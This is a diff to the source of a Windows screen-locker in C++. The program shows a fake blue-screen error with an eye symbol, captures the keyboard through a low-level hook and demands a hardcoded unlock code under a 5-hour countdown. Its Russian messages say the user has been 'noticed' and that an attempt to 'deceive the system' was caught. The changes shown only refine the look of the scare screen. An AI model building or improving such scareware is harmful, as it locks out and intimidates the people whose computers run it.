@@ -6,7 +6,7 @@ const std::wstring PASSWORD = L"29042011";
 std::wstring input_text = L"";
 bool is_bsod = false;
 DWORD start_time = 0;
-int time_left = 5 * 60 * 60;
+int time_left = 5 * 60 * 60; // 5 часов
 DWORD last_timer_tick = 0;
 bool show_error = false;
 DWORD error_time = 0;
@@ -44,7 +44,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     switch (msg) {
     case WM_CREATE:
         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-        // Ускоряем таймер (15 мс)
         SetTimer(hwnd, 1, 15, NULL); 
         {
             wchar_t buf[256];
@@ -57,7 +56,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         return 0;
 
     case WM_TIMER:
-        // Быстрая печать (по 2 символа за тик)
         if (!is_bsod && typed_chars < full_log_text.length()) {
             typed_chars += 2; 
             if (typed_chars > full_log_text.length()) typed_chars = full_log_text.length();
@@ -70,8 +68,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
             if (time_left > 0) time_left--;
             last_timer_tick = GetTickCount();
+        }
+        
+        // Постоянная перерисовка для мигающего Enter
+        if (is_bsod) {
             InvalidateRect(hwnd, NULL, TRUE);
         }
+
         if (show_error && GetTickCount() - error_time > 3000) {
             show_error = false;
             InvalidateRect(hwnd, NULL, TRUE);
@@ -119,18 +122,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 current_text += L"_";
             }
             
-            // ЖЕСТКО В ЛЕВОМ ВЕРХНЕМ УГЛУ
             RECT errRect = {10, 10, 800, 600};
             DrawTextW(hdc, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
             
-            // Глаз (используем большой юникод-символ глаза, по центру)
             HFONT fontEye = CreateFontW(120, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
             SelectObject(hdc, fontEye);
             SetTextColor(hdc, RGB(255, 255, 255));
             RECT eyeRect = {cx - 200, cy - 100, cx + 200, cy + 100};
             DrawTextW(hdc, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
             
-            // Текст "ВАС ЗАМЕТИЛИ"
             HFONT fontLarge = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontLarge);
             RECT titleRect = {cx - 300, cy + 80, cx + 300, cy + 150};
@@ -149,7 +149,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             HFONT font = CreateFontW(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, font);
 
-            // Верхняя плашка (такая же ширина, как нижнее поле ввода - 1100)
+            // Верхняя плашка
             RECT whiteRect = {cx - 550, cy - 320, cx + 550, cy - 270};
             HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &whiteRect, whiteBrush);
@@ -173,7 +173,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
-            // Поле ввода (1100 в ширину)
+            // Поле ввода
             RECT inputRect = {cx - 550, cy + 100, cx + 550, cy + 150};
             HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &inputRect, inputBrush);
@@ -183,12 +183,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
             DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Имя ПК и Таймер
+            // Имя ПК
             SetTextColor(hdc, RGB(255, 255, 255));
             RECT bottomRect = {50, rect.bottom - 150, 800, rect.bottom - 110};
             std::wstring bottom = L"Current PC: " + pc_name;
             DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
             
+            // ТАЙМЕР (СДЕЛАЛ ЧЕРНЫМ)
             int hrs = time_left / 3600;
             int mins = (time_left % 3600) / 60;
             int secs = time_left % 60;
@@ -197,18 +198,38 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             HFONT fontTimer = CreateFontW(36, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontTimer);
-            SetTextColor(hdc, RGB(0, 255, 0));
+            SetTextColor(hdc, RGB(0, 0, 0)); // Черный цвет
             RECT timerRect = {50, rect.bottom - 100, 800, rect.bottom - 40};
             DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Окно ошибки
+            // МИГАЮЩИЙ ENTER (В ПРАВОМ НИЖНЕМ УГЛУ)
+            if ((GetTickCount() / 500) % 2 == 0) {
+                SetTextColor(hdc, RGB(255, 255, 255));
+                RECT enterRect = {rect.right - 300, rect.bottom - 100, rect.right - 50, rect.bottom - 40};
+                DrawTextW(hdc, L"Enter [\u0412\u0412\u041e\u0414]", -1, &enterRect, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
+            }
+
+            // Окно ошибки (СДЕЛАЛ АККУРАТНЕЕ)
             if (show_error) {
-                RECT errRect = {cx - 300, cy - 60, cx + 300, cy + 60};
-                HBRUSH redBrush = CreateSolidBrush(RGB(204, 0, 0));
+                // Тень
+                RECT shadowRect = {cx - 302, cy - 52, cx + 302, cy + 52};
+                HBRUSH shadowBrush = CreateSolidBrush(RGB(100, 0, 0));
+                FillRect(hdc, &shadowRect, shadowBrush);
+                DeleteObject(shadowBrush);
+
+                // Само окно
+                RECT errRect = {cx - 300, cy - 50, cx + 300, cy + 50};
+                HBRUSH redBrush = CreateSolidBrush(RGB(170, 0, 0)); // Темно-красный
                 FillRect(hdc, &errRect, redBrush);
                 DeleteObject(redBrush);
+                
+                // Белая рамка
+                HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
+                FrameRect(hdc, &errRect, frameBrush);
+                DeleteObject(frameBrush);
+
                 SetTextColor(hdc, RGB(255, 255, 255));
-                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u0438 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430\n\u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443!", -1, &errRect, DT_CENTER | DT_VCENTER);
+                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430 \u043e\u0431\u043c\u0430\u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u044b!", -1, &errRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
             }
             DeleteObject(font);
             DeleteObject(fontTimer);
